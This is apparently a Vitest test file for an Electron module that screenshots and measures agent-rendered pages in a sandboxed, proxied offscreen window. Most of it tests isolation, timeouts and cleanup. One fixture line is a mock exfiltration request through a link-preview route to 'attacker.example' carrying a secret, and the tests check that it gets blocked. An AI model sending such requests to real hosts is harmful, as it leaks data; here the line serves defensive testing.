import { afterEach, describe, expect, it, vi } from "vitest";
import { CONTENT_HEIGHT_SCRIPT, checkRender, measureRender } from "./render-check";
import { allowRenderPage, startRenderCheckProxy } from "./render-check-proxy";

// The proxy itself is tested over real sockets in render-check-proxy.test.ts.
vi.mock("./render-check-proxy", () => ({
	startRenderCheckProxy: vi.fn(async (network: string) => (network === "none" ? 1081 : 1080)),
	allowRenderPage: vi.fn(() => vi.fn()),
}));

const url = "http://127.0.0.1:3001/api/v1/sessions/p-1/renders/check-id-001";

type FakeOptions = {
	loadError?: Error;
	measureNeverReturns?: boolean;
	emptyImage?: boolean;
	manualPaint?: boolean;
	refused?: string[];
	/** The height the page needs; 412 unless set. */
	contentHeight?: number;
	/** The first capture is still the frame from before the resize. */
	staleFirstCapture?: boolean;
	/** PNG bytes per pixel of the captured image, to make large screenshots. */
	pngBytesPerPixel?: number;
	/** Requests the page makes while it loads; the session's guard decides each. */
	requests?: string[];
};

/**
 * A hidden window around a page. The page's viewport reaches a new size one
 * read after setContentSize, as a real resize does; reads go through the
 * isolated world, so the page's main world is never used.
 */
function fakes(options: FakeOptions = {}) {
	const events: string[] = [];
	const listeners = new Map<string, (...args: unknown[]) => void>();
	const paintListeners: Array<() => void> = [];
	const paint = () => {
		events.push("paint");
		for (const listener of paintListeners.splice(0)) listener();
	};
	const permissionRequest = vi.fn();
	const cancelled: Record<string, boolean> = {};
	const contents = {
		session: {
			setPermissionRequestHandler: (handler: (...args: unknown[]) => void) => permissionRequest.mockImplementation(handler),
			setPermissionCheckHandler: vi.fn(),
			setProxy: vi.fn(async () => {}),
			webRequest: { onBeforeRequest: vi.fn() },
		},
		id: 7,
		setWindowOpenHandler: vi.fn(),
		setWebRTCIPHandlingPolicy: vi.fn(),
		on: (event: string, listener: (...args: unknown[]) => void) => listeners.set(event, listener),
		once: (event: string, listener: () => void) => {
			if (event === "paint") paintListeners.push(listener);
		},
		loadURL: vi.fn(async () => {
			// The proxy refuses these while the page loads.
			const onRefused = vi.mocked(allowRenderPage).mock.lastCall?.[2];
			for (const destination of options.refused ?? []) onRefused?.(destination);
			const guard = contents.session.webRequest.onBeforeRequest.mock.lastCall?.[0] as
				| ((details: { url: string; webContentsId: number }, callback: (response: { cancel: boolean }) => void) => void)
				| undefined;
			for (const request of options.requests ?? []) {
				guard?.({ url: request, webContentsId: contents.id }, ({ cancel }) => (cancelled[request] = cancel));
			}
			if (options.loadError) throw options.loadError;
			listeners.get("console-message")?.({}, 3, "Uncaught ReferenceError: d3 is not defined", 1, url);
		}),
		executeJavaScript: vi.fn((_script: string): Promise<unknown> => Promise.resolve(undefined)),
		// A script that fails in an isolated world resolves undefined.
		executeJavaScriptInIsolatedWorld: vi.fn((_worldId: number, scripts: Array<{ code: string }>): Promise<unknown> => {
			if (options.measureNeverReturns) return new Promise(() => {});
			const code = scripts[0]?.code;
			if (code === `[${CONTENT_HEIGHT_SCRIPT}]`) return Promise.resolve([options.contentHeight ?? 412]);
			if (code === "[innerWidth, innerHeight]") {
				const seen = [...viewport];
				viewport = [...target];
				return Promise.resolve(seen);
			}
			return Promise.resolve(undefined);
		}),
		// An offscreen page repaints on invalidate(); manualPaint holds that frame back.
		invalidate: vi.fn(() => {
			events.push("invalidate");
			if (!options.manualPaint) queueMicrotask(paint);
		}),
		capturePage: vi.fn(async () => {
			events.push("capture");
			const stale = options.staleFirstCapture && contents.capturePage.mock.calls.length === 1;
			return image(stale ? created : options.emptyImage ? [0, 0] : target);
		}),
	};
	const image = ([width, height]: number[]): Record<string, unknown> => ({
		isEmpty: () => width === 0,
		getSize: () => ({ width, height }),
		toPNG: () =>
			options.pngBytesPerPixel ? Buffer.alloc(Math.ceil(width * height * options.pngBytesPerPixel)) : Buffer.from("png-bytes"),
		resize: ({ width: to }: { width: number }) => image([to, Math.round((height * to) / width)]),
	});
	let created = [0, 0];
	let viewport = [0, 0];
	let target = [0, 0];
	const window = {
		webContents: contents,
		setContentSize: vi.fn((width: number, height: number) => {
			events.push(`resize ${width}x${height}`);
			target = [width, height];
		}),
		destroy: vi.fn(),
	};
	// A function, not an arrow: checkRender calls it with `new` (vitest 4 rejects arrow constructors).
	const BrowserWindow = vi.fn(function (options: { width: number; height: number }) {
		created = [options.width, options.height];
		viewport = [...created];
		target = [...created];
		return window;
	});
	return { contents, window, BrowserWindow, permissionRequest, events, paint, cancelled };
}

const png = Buffer.from("png-bytes").toString("base64");

describe("checkRender", () => {
	it("loads only daemon render URLs at a supported width, before creating anything", async () => {
		const f = fakes();
		await expect(checkRender(f as never, { url: "https://example.com/", width: 720 })).rejects.toThrow(/daemon render URL/);
		await expect(checkRender(f as never, { url: url.replace("/renders/", "/files/"), width: 720 })).rejects.toThrow(/daemon render URL/);
		// The pattern passes it; parsing does not.
		await expect(checkRender(f as never, { url: url.replace("3001", "99999"), width: 720 })).rejects.toMatchObject({
			code: "INVALID_ARGUMENT",
		});
		await expect(checkRender(f as never, { url, width: 100 })).rejects.toThrow(/width/);
		expect(f.BrowserWindow).not.toHaveBeenCalled();
	});

	it("returns the screenshot, height, and console, from a hidden offscreen sandboxed window", async () => {
		const f = fakes();
		const result = await checkRender(f as never, { url, width: 390 });
		expect(result).toEqual({
			data: png,
			width: 390,
			height: 412,
			imageWidth: 390,
			imageHeight: 412,
			contentHeight: 412,
			consoleMessages: [{ level: "error", text: "Uncaught ReferenceError: d3 is not defined" }],
		});
		// Offscreen so it paints without ever being on screen; one fixed partition
		// with no "persist:" prefix, so checks share one in-memory session. The
		// size is the viewport's, so the page lays out at the asked-for width.
		expect(f.BrowserWindow).toHaveBeenCalledWith({
			show: false,
			width: 390,
			height: 800,
			useContentSize: true,
			webPreferences: {
				offscreen: true,
				sandbox: true,
				contextIsolation: true,
				nodeIntegration: false,
				backgroundThrottling: false,
				partition: "ao-render-check",
			},
		});
		const decide = vi.fn();
		f.permissionRequest({}, "media", decide);
		expect(decide).toHaveBeenCalledWith(false);
		// Read where the page's own globals cannot reach.
		expect(f.contents.executeJavaScriptInIsolatedWorld).toHaveBeenCalledWith(999, [{ code: `[${CONTENT_HEIGHT_SCRIPT}]` }]);
		expect(f.contents.executeJavaScript).not.toHaveBeenCalled();
		expect(f.window.destroy).toHaveBeenCalled();
	});

	it("routes the partition through the public-address proxy once, before the first load, with WebRTC UDP off", async () => {
		const f = fakes();
		await checkRender(f as never, { url, width: 390 });
		await checkRender(f as never, { url, width: 390 });
		// Without <-loopback>, Chromium would reach loopback directly.
		expect(f.contents.session.setProxy).toHaveBeenCalledTimes(1);
		expect(f.contents.session.setProxy).toHaveBeenCalledWith({ proxyRules: "socks5://127.0.0.1:1080", proxyBypassRules: "<-loopback>" });
		expect(f.contents.session.setProxy.mock.invocationCallOrder[0]).toBeLessThan(f.contents.loadURL.mock.invocationCallOrder[0]!);
		expect(f.contents.setWebRTCIPHandlingPolicy).toHaveBeenCalledWith("disable_non_proxied_udp");
	});

	it("allows only the page's own address, and reports each refused destination once as a warning", async () => {
		const f = fakes({ refused: ["192.168.1.1:80", "192.168.1.1:80", "[::1]:22"] });
		const result = await checkRender(f as never, { url: url.replace("127.0.0.1", "localhost"), width: 390 });
		expect(allowRenderPage).toHaveBeenLastCalledWith("localhost", 3001, expect.any(Function));
		expect(result.consoleMessages).toEqual([
			{ level: "warning", text: "AO blocked a request to 192.168.1.1:80. A render check loads only public addresses." },
			{ level: "warning", text: "AO blocked a request to [::1]:22. A render check loads only public addresses." },
			{ level: "error", text: "Uncaught ReferenceError: d3 is not defined" },
		]);
	});

	it("keeps the page off the daemon's other routes, whose host and port the proxy lets through", async () => {
		const linkPreview = "http://127.0.0.1:3001/api/v1/link-preview?url=https://attacker.example/?d=secret";
		const f = fakes({ requests: [url, linkPreview, "https://cdn.example/d3.js"] });
		const result = await checkRender(f as never, { url, width: 390, network: "none" });
		// Public addresses are the proxy's to refuse; the guard only holds the daemon to the page.
		expect(f.cancelled).toEqual({ [url]: false, [linkPreview]: true, "https://cdn.example/d3.js": false });
		expect(result.consoleMessages[0]).toEqual({
			level: "warning",
			text: "AO blocked a request to 127.0.0.1:3001/api/v1/link-preview. The agent has no network access, so the check loads no network resources.",
		});
	});

	it("releases the page's allowance when the check ends, on success and on error", async () => {
		await checkRender(fakes() as never, { url, width: 390 });
		expect(vi.mocked(allowRenderPage).mock.results.at(-1)?.value).toHaveBeenCalledTimes(1);
		await expect(checkRender(fakes({ loadError: new Error("ERR_CONNECTION_REFUSED") }) as never, { url, width: 390 })).rejects.toThrow();
		expect(vi.mocked(allowRenderPage).mock.results.at(-1)?.value).toHaveBeenCalledTimes(1);
	});

	it("captures only once the page has painted at the measured size", async () => {
		const f = fakes({ manualPaint: true });
		const result = checkRender(f as never, { url, width: 390 });
		await vi.waitFor(() => expect(f.contents.invalidate).toHaveBeenCalled());
		await new Promise((resolve) => setTimeout(resolve, 20));
		expect(f.contents.capturePage).not.toHaveBeenCalled();
		f.paint();
		await expect(result).resolves.toMatchObject({ data: png, height: 412 });
		expect(f.events).toEqual(["resize 390x412", "invalidate", "paint", "capture"]);
	});

	it("caps the captured height at 2000 px", async () => {
		const f = fakes({ contentHeight: 5_000 });
		await expect(checkRender(f as never, { url, width: 390 })).resolves.toMatchObject({ height: 2_000, contentHeight: 5_000 });
		expect(f.window.setContentSize).toHaveBeenCalledWith(390, 2_000);
	});

	it("fails on an empty capture instead of returning a blank image", async () => {
		const f = fakes({ emptyImage: true });
		await expect(checkRender(f as never, { url, width: 720 })).rejects.toMatchObject({
			code: "BROWSER_COMMAND_FAILED",
			message: expect.stringMatching(/empty/),
		});
		expect(f.window.destroy).toHaveBeenCalled();
	});

	it("captures again when the first frame is still the size from before the resize", async () => {
		const f = fakes({ staleFirstCapture: true });
		await expect(checkRender(f as never, { url, width: 390 })).resolves.toMatchObject({ imageWidth: 390, imageHeight: 412 });
		expect(f.contents.capturePage).toHaveBeenCalledTimes(2);
	});

	it("scales a screenshot too large to hand back until it fits, and says so", async () => {
		const f = fakes({ contentHeight: 2_000, pngBytesPerPixel: 6 });
		const result = await checkRender(f as never, { url, width: 1_600 });
		expect(result).toMatchObject({ width: 1_600, height: 2_000 });
		expect(Buffer.from(result.data, "base64").length).toBeLessThanOrEqual(3.5 * 1024 * 1024);
		expect(result.imageWidth).toBeLessThan(1_600);
		expect(result.imageHeight).toBe(Math.round((2_000 * result.imageWidth) / 1_600));
	});

	it("loads a page with no network in its own partition and proxy when the agent has none", async () => {
		const f = fakes({ refused: ["example.com:443"] });
		const result = await checkRender(f as never, { url, width: 390, network: "none" });
		expect(f.BrowserWindow).toHaveBeenCalledWith(
			expect.objectContaining({ webPreferences: expect.objectContaining({ partition: "ao-render-check-offline" }) }),
		);
		expect(startRenderCheckProxy).toHaveBeenLastCalledWith("none");
		expect(f.contents.session.setProxy).toHaveBeenCalledWith({ proxyRules: "socks5://127.0.0.1:1081", proxyBypassRules: "<-loopback>" });
		expect(result.consoleMessages[0]).toEqual({
			level: "warning",
			text: "AO blocked a request to example.com:443. The agent has no network access, so the check loads no network resources.",
		});
		await expect(checkRender(fakes() as never, { url, width: 390, network: "lan" })).rejects.toMatchObject({ code: "INVALID_ARGUMENT" });
	});

	it("destroys the window when the page fails to load", async () => {
		const f = fakes({ loadError: new Error("ERR_CONNECTION_REFUSED") });
		await expect(checkRender(f as never, { url, width: 720 })).rejects.toThrow(/ERR_CONNECTION_REFUSED/);
		expect(f.window.destroy).toHaveBeenCalled();
	});
});

describe("CONTENT_HEIGHT_SCRIPT", () => {
	const measure = (documentElement: { scrollHeight: number; clientHeight: number; rectHeight: number }) =>
		new Function("document", `return ${CONTENT_HEIGHT_SCRIPT}`)({
			documentElement: {
				scrollHeight: documentElement.scrollHeight,
				clientHeight: documentElement.clientHeight,
				getBoundingClientRect: () => ({ height: documentElement.rectHeight }),
			},
		});

	it("reports a short page's own height, not the viewport's", () => {
		expect(measure({ scrollHeight: 800, clientHeight: 800, rectHeight: 300 })).toBe(300);
	});

	it("reports a tall page's scroll height", () => {
		expect(measure({ scrollHeight: 1500, clientHeight: 800, rectHeight: 1500 })).toBe(1500);
	});

	it("rounds a fractional height up", () => {
		expect(measure({ scrollHeight: 800, clientHeight: 800, rectHeight: 300.2 })).toBe(301);
	});
});

describe("checkRender deadline and cancellation", () => {
	afterEach(() => vi.useRealTimers());

	it("gives up on a page that stops answering after it loads, and destroys the window", async () => {
		vi.useFakeTimers();
		const f = fakes({ measureNeverReturns: true });
		const result = checkRender(f as never, { url, width: 720 });
		const rejected = expect(result).rejects.toMatchObject({
			code: "BROWSER_COMMAND_FAILED",
			message: expect.stringMatching(/timed out after 20000 ms while measuring the page/),
		});
		await vi.advanceTimersByTimeAsync(20_000);
		await rejected;
		expect(f.window.destroy).toHaveBeenCalled();
	});

	it("gives up on a page that never paints after the resize, and destroys the window", async () => {
		vi.useFakeTimers();
		const f = fakes({ manualPaint: true });
		const result = checkRender(f as never, { url, width: 720 });
		const rejected = expect(result).rejects.toMatchObject({
			code: "BROWSER_COMMAND_FAILED",
			message: expect.stringMatching(/timed out after 20000 ms while capturing the screenshot/),
		});
		await vi.advanceTimersByTimeAsync(20_000);
		await rejected;
		expect(f.contents.capturePage).not.toHaveBeenCalled();
		expect(f.window.destroy).toHaveBeenCalled();
	});

	it("stops when the daemon cancels during the settle wait", async () => {
		vi.useFakeTimers();
		const f = fakes();
		const controller = new AbortController();
		const result = checkRender(f as never, { url, width: 720 }, controller.signal);
		const rejected = expect(result).rejects.toMatchObject({ code: "BROWSER_COMMAND_CANCELED" });
		await vi.advanceTimersByTimeAsync(100);
		controller.abort();
		await rejected;
		expect(f.contents.executeJavaScriptInIsolatedWorld).not.toHaveBeenCalled();
		expect(f.window.destroy).toHaveBeenCalled();
	});

	it("refuses to start for a signal that is already aborted", async () => {
		vi.useFakeTimers();
		const f = fakes();
		const result = checkRender(f as never, { url, width: 720 }, AbortSignal.abort());
		await expect(result).rejects.toMatchObject({ code: "BROWSER_COMMAND_CANCELED" });
		expect(f.window.destroy).toHaveBeenCalled();
	});

	it("leaves no timer or abort listener behind after a successful check", async () => {
		vi.useFakeTimers();
		const f = fakes();
		const controller = new AbortController();
		const removeListener = vi.spyOn(controller.signal, "removeEventListener");
		const result = checkRender(f as never, { url, width: 720 }, controller.signal);
		await vi.advanceTimersByTimeAsync(400);
		await expect(result).resolves.toMatchObject({ contentHeight: 412 });
		expect(vi.getTimerCount()).toBe(0);
		expect(removeListener).toHaveBeenCalledWith("abort", expect.any(Function));
	});
});

describe("measureRender", () => {
	afterEach(() => vi.useRealTimers());

	const published = "http://127.0.0.1:3001/api/v1/sessions/p-1/renders/0b7c4f6e-1d2a-4e8b-9c3d-5a6f7e8d9c0b";

	/**
	 * A page whose viewport reaches each new width one read late, as a real
	 * resize does, and whose height follows its viewport one read later still,
	 * as a page that lays itself out again in a resize handler does.
	 */
	function measuring(f: ReturnType<typeof fakes>, heightAt: (width: number) => number) {
		let viewport = 0;
		let laidOutAt = 0;
		f.contents.executeJavaScriptInIsolatedWorld.mockImplementation(async () => {
			const read = [viewport, heightAt(laidOutAt)];
			laidOutAt = viewport;
			viewport = f.window.setContentSize.mock.lastCall?.[0] ?? 0;
			f.events.push(`read ${read[0]}`);
			return read;
		});
	}

	it("loads a published page once, then sets each width and reads its height there, in the order given", async () => {
		const f = fakes();
		measuring(f, (width) => 100_000 / width);
		const result = await measureRender(f as never, { url: published, widths: [640, 320, 1144] });
		expect(result).toEqual({
			heights: [
				[640, 157],
				[320, 313],
				[1144, 88],
			],
		});
		expect(f.BrowserWindow).toHaveBeenCalledTimes(1);
		expect(f.BrowserWindow).toHaveBeenCalledWith(expect.objectContaining({ show: false, width: 640, height: 80 }));
		expect(f.contents.loadURL).toHaveBeenCalledTimes(1);
		expect(f.contents.loadURL).toHaveBeenCalledWith(published);
		// A read from before the page reached the width is not used, and the
		// height is read again once the page's resize handlers have run.
		expect(f.events).toEqual([
			"resize 640x80",
			"read 0",
			"read 640",
			"read 640",
			"resize 320x80",
			"read 640",
			"read 320",
			"read 320",
			"resize 1144x80",
			"read 320",
			"read 1144",
			"read 1144",
		]);
		// Read where the page's own globals cannot reach.
		expect(f.contents.executeJavaScriptInIsolatedWorld).toHaveBeenCalledWith(999, [{ code: expect.stringContaining(CONTENT_HEIGHT_SCRIPT) }]);
		expect(f.contents.executeJavaScript).not.toHaveBeenCalled();
		expect(f.window.destroy).toHaveBeenCalled();
	});

	it("takes each height after the page has laid itself out at that width", async () => {
		const f = fakes();
		// The height a resize handler sets from innerWidth.
		measuring(f, (width) => (width < 500 ? 900 : 300));
		await expect(measureRender(f as never, { url: published, widths: [320, 640, 375] })).resolves.toEqual({
			heights: [
				[320, 900],
				[640, 300],
				[375, 900],
			],
		});
	});

	it("clamps each height to 1-2000 whole pixels", async () => {
		const f = fakes();
		const heights = new Map([
			[320, 5_000],
			[375, 0],
			[430, Number.NaN],
			[520, 412.2],
		]);
		measuring(f, (width) => heights.get(width)!);
		await expect(measureRender(f as never, { url: published, widths: [...heights.keys()] })).resolves.toEqual({
			heights: [
				[320, 2_000],
				[375, 1],
				[430, 1],
				[520, 413],
			],
		});
	});

	it("refuses bad widths and URLs before creating anything", async () => {
		const f = fakes();
		for (const widths of [undefined, "320", [], Array(17).fill(320), [239], [1_601], [320.5], [320, "375"]]) {
			await expect(measureRender(f as never, { url: published, widths })).rejects.toMatchObject({
				code: "INVALID_ARGUMENT",
				message: expect.stringMatching(/1 to 16 widths/),
			});
		}
		for (const bad of ["https://example.com/", published.replace("/renders/", "/files/"), published.replace("3001", "99999")]) {
			await expect(measureRender(f as never, { url: bad, widths: [320] })).rejects.toMatchObject({ code: "INVALID_ARGUMENT" });
		}
		expect(f.BrowserWindow).not.toHaveBeenCalled();
	});

	it("allows the page's address only while the page is in use", async () => {
		const f = fakes();
		measuring(f, () => 300);
		await measureRender(f as never, { url: published, widths: [320, 375] });
		expect(allowRenderPage).toHaveBeenLastCalledWith("127.0.0.1", 3001, expect.any(Function));
		const allowed = vi.mocked(allowRenderPage).mock.invocationCallOrder.at(-1)!;
		const release = vi.mocked(allowRenderPage).mock.results.at(-1)?.value as ReturnType<typeof vi.fn>;
		expect(release).toHaveBeenCalledTimes(1);
		expect(allowed).toBeLessThan(f.contents.loadURL.mock.invocationCallOrder[0]!);
		expect(release.mock.invocationCallOrder[0]).toBeGreaterThan(f.contents.executeJavaScriptInIsolatedWorld.mock.invocationCallOrder.at(-1)!);
	});

	it("destroys the window when setting it up throws", async () => {
		const f = fakes();
		vi.mocked(allowRenderPage).mockImplementationOnce(() => {
			throw new Error("no proxy");
		});
		await expect(measureRender(f as never, { url: published, widths: [320] })).rejects.toThrow(/no proxy/);
		expect(f.window.destroy).toHaveBeenCalled();
	});

	it("destroys the window and releases the page when the load fails", async () => {
		const f = fakes({ loadError: new Error("ERR_CONNECTION_REFUSED") });
		await expect(measureRender(f as never, { url: published, widths: [320] })).rejects.toThrow(/ERR_CONNECTION_REFUSED/);
		expect(f.window.destroy).toHaveBeenCalled();
		expect(vi.mocked(allowRenderPage).mock.results.at(-1)?.value).toHaveBeenCalledTimes(1);
	});

	it("fails within a second at a width the viewport never reaches, and destroys the window", async () => {
		vi.useFakeTimers();
		// A platform that clamps the window, and an isolated-world script that fails.
		for (const answer of [[1_000, 300], undefined]) {
			const f = fakes();
			f.contents.executeJavaScriptInIsolatedWorld.mockResolvedValue(answer);
			const rejected = expect(measureRender(f as never, { url: published, widths: [1_144] })).rejects.toMatchObject({
				code: "BROWSER_COMMAND_FAILED",
				message: expect.stringMatching(/viewport did not reach 1144 px/),
			});
			await vi.advanceTimersByTimeAsync(300 + 1_100);
			await rejected;
			expect(f.window.destroy).toHaveBeenCalled();
		}
	});

	it("gives up at the deadline on a page that stops answering, and destroys the window", async () => {
		vi.useFakeTimers();
		const f = fakes({ measureNeverReturns: true });
		const rejected = expect(measureRender(f as never, { url: published, widths: [320, 375] })).rejects.toMatchObject({
			code: "BROWSER_COMMAND_FAILED",
			message: expect.stringMatching(/render measure timed out after 20000 ms while measuring the page at 320 px/),
		});
		await vi.advanceTimersByTimeAsync(20_000);
		await rejected;
		expect(f.window.destroy).toHaveBeenCalled();
		expect(vi.mocked(allowRenderPage).mock.results.at(-1)?.value).toHaveBeenCalledTimes(1);
	});
});
